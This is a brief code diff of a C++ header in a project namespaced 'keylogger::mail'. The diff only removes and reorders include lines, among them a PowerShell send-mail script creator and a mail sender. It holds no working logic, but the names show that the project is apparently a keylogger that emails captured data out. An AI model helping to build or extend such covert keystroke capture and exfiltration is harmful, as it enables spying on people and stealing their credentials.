@@ -1,13 +1,7 @@
 #pragma once
 
-#include <Windows.h>
-#include <fstream>
-#include <iostream>
-#include <vector>
-
-#include "DefaultFileSystemAccess.h"
-#include "PowerShellSendMailScriptCreator.h"
 #include "MailSender.h"
+#include "PowerShellSendMailScriptCreator.h"
 
 namespace keylogger::mail
 {
